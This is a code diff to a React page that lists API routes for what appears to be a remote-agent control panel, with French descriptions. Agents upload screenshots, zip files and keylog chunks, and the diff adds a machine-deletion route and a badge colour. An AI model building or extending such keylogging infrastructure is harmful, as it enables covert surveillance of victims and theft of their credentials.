@@ -15,7 +15,8 @@ const API_ROUTES = [
   { method: 'POST', path: '/api/machines/:id/result',           description: 'Agent envoie le résultat' },
   { method: 'POST', path: '/api/machines/:id/upload',           description: 'Agent upload un fichier (screenshot, zip)' },
   { method: 'POST', path: '/api/machines/:id/keylog',           description: 'Agent envoie un chunk de keylog' },
-  { method: 'GET',  path: '/api/machines/:id/download/:file',   description: 'Frontend télécharge un fichier' },
+  { method: 'GET',    path: '/api/machines/:id/download/:file',   description: 'Frontend télécharge un fichier' },
+  { method: 'DELETE', path: '/api/machines/:id',                  description: 'Frontend supprime une machine' },
 ]
 
 // Stack technique utilisée dans le projet
@@ -44,8 +45,8 @@ function MethodBadge({ method }) {
       variant="outline"
       className={cn(
         'font-mono text-[10px] px-1.5 flex-shrink-0',
-        method === 'GET'
-          ? 'border-blue-500/30 bg-blue-500/10 text-blue-400'
+        method === 'GET'    ? 'border-blue-500/30 bg-blue-500/10 text-blue-400'
+          : method === 'DELETE' ? 'border-red-500/30 bg-red-500/10 text-red-400'
           : 'border-green-500/30 bg-green-500/10 text-green-400'
       )}
     >
